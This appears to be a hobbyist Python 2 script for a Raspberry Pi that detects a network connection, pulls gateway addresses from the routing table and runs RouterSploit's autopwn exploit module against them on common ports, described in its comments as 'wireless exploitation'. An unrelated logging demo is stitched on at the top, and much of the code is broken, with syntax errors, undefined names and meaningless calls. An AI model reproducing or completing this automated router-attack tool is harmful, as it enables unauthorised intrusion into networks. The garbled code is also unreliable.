
#!/usr/bin/env/python
#coding=UTF-8
from __future__ import absolute_import
from __future__ import print_function
import logging
import io

### Create the logger
logger = logging.getLogger('basic_logger')
logger.setLevel(logging.DEBUG)

### Setup the console handler with a StringIO object
log_capture_string = io.StringIO()
ch = logging.StreamHandler(log_capture_string)
ch.setLevel(logging.DEBUG)

### Optionally add a formatter
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
ch.setFormatter(formatter)

### Add the console handler to the logger
logger.addHandler(ch)


### Send log messages.
logger.debug('debug message')
logger.info('info message')
logger.warn('warn message')
logger.error('error message')
logger.critical('critical message')


### Pull the contents back into a string and close the stream
log_contents = log_capture_string.getvalue()
log_capture_string.close()

### Output as lower case to prove it worked.
print((log_contents.lower())
import rsf
import routersploit
from routersploit import *
from routersploit import shell
from os import path
from routersploit import *
from routersploit import exploits
from routersploit import payloads
from routersploit import wordlists
from routersploit import validators
from routersploit.shell import shell
###  CUSTOM COMMAND. Discovered new options that enabled me to directly inject python statements into RSF.
import interpreter
from interpreter import * ############ VITAL! Otherwise you cannot access the engine that processes human input into their shell syntax
from shell import *
import importlib
from importlib import *

from routersploit import (exploits,print_error,print_success,print_status,print_info,utils,threads)

import threading
import subprocess

from routersploit.utils import (
print_error,
print_status,
print_success,

print_info,
sanitize_url,
LockedIterator,
random_text,
http_request,
boolify,
mute,
multi,
index_modules,
ssh_interactive,
tokenize,
)

from itertools import chain
from weakref import WeakKeyDictionary

from routersploit.utils import print_status, NonStringIterable

import printer
from printer import absolute_import


def routersploit_cmd(target,port,threads):
    routersploit.interpreter.parse_line()
    routersploit.interpreter.command_use('routersploit/interpreter')
    routersploit.interpreter.parse_line()
    routersploit.interpreter.exploits()
    exploits.Exploit()
    routersploit.exploits.("autopwn")
    routersploit.exploits.ExploitOptionsAggregator()

    target = str(target)
    port = int(port)
    threads = int(8)

    routersploit.exploits.option(target,'')
    routersploit.exploits.Option(port, '')
    routersploit.exploits.Option(threads,'')
    self = "routersploit.exploits"
    exploit.Exploit.run_threads(self)
    self.command_run(self)
    routersploit.utils.print_status
    self.history_file
    exploits.print_status.func_globals()
    printer.PrinterThread()
    printer.PrinterThread.start()
    printer.print_function()
    printer.thread_output_stream.data.fromkeys()
    printer.thread_output_stream.data.has_key()
    printer.thread_output_stream.data.iterkeys()
    printer.thread_output_stream.data.itervalues()
    printer.thread_output_stream.data.viewkeys()
    printer.thread_output_stream.data.viewvalues()
    interpreter.RoutersploitInterpreter.command_run(self)

    return

def bash_command_bg(cmd):
    p = subprocess.Popen(cmd,shell=True,executable='/bin/bash')
    # executes the commands and then returns the process back to us as a separate thread.
    return p
def bash_command(cmd):
    output = subprocess.call(cmd,shell=True,executable='/bin/bash')
    return output
def pull_routing_path():
    command = """route -n | egrep -v "0.0.0.0|Gateway|routing|127.0.0.1" | sort | uniq | awk '{{print $2}}'"""
    extract_targets(target)
    return
def extract_targets(results):
    for target in results not "127.0.0.1" or "0.0.0.0":
         target = str(target)
         port_list = [80,443,8080,81,4567,9999,22,23,25,53]

         # for ip in results:
         threads = int(8)
         target = exploits.Option(str(target))
         for port in list_of_ports:
             port = exploits.Option(int(port))
             routersploit_cmd(target, port, threads)
    return
def command_reel():
    RoutersploitInterpreter.parse_line.__init__
    RoutersploitInterpreter.command_use.__name__
    self = "routersploit/interpreter"
    RoutersploitInterpreter.parse_line.__init__
    exploits.__init__
    exploits.Exploit.__init__
    routersploit.exploits.__name__ = "autopwn"
    routersploit.exploits.ExploitOptionsAggregator.__init__


    ############### oh wow. it actually workedd. Make sure you encode your strings into hex before you write, and decode before you interpret.

    ### to initialize###
    target = ''
    port = 0
    threads = 8


    ### maybe I am supoosed to have the second string NOT EMPTY.


    ### importing the values
    target = ('{0}').decode('hex')
    port = {1}
    threads = {2}

    # ## ValueError: invalid literal for int(float() with base 10:
    ### https://stackoverflow.com/questions/1841565/valueerror-invalid-literal-for-int-with-base-10
    ## I learned its not a good idea to convert from text files back to python. AS it turns out formatting errors are everywhere!
    target = str(target)
    port = int(float(port))
    threads = int(float(threads))

    target = target.decode('unicode')

    # routersploit.exploits.Option = (object,string)
    routersploit.exploits.Option(target, '')
    routersploit.exploits.Option(port, '')
    routersploit.exploits.Option(threads,'')


    exploits.Exploit.run_threads.im_self

    RoutersploitInterpreter.command_run.im_self
    routersploit.utils.print_status
    RoutersploitInterpreter.history_file
    RoutersploitInterpreter.history_file.decode
    exploits.print_status.func_globals
    # print sys.stdout
    # print sys.stdout.encoding
    # print sys.stdout.errors
    # print sys.stdout.write

    ############# print everything ##################


    printer.print_function()
    printer.PrinterThread.start()
    printer.PrinterThread.__init__()
    printer.thread_output_stream.data.fromkeys()
    printer.thread_output_stream.data.has_key()
    printer.thread_output_stream.data.iterkeys()
    printer.thread_output_stream.data.itervalues()
    printer.thread_output_stream.data.viewkeys()
    printer.thread_output_stream.data.viewvalues()


    ############# run command ################
    interpreter.RoutersploitInterpreter.command_run.im_self.__init__


def detect_network():
    # detects the assignment  of a local IP, which guarantees that you have been connected to the LOCAL network, good enough for wireless exploitation
    time.sleep(5) # checks every 5 seconds
    detection_test = "ifconfig | grep inet | awk '{{print $2}}'"
    test_results = bash_command(detection_test)
    if test_results != "" or None or 0:
        if test_results != "0.0.0.0" or '127.0.0.1' or 'ether':
            print "SUCCESSFULLY CONNECTED: Your ip address is \n\t%s" % test_results
            bash_command("python /usr/local/bin/routersploit/printer.py &") # run it in background
            time.sleep(2)
            pull_routing_path()
        else:
            detect_network()
    else:
        detect_network()
    return
print "Raspberry Pi just booted. Scanning for networks to login to."
detect_network()
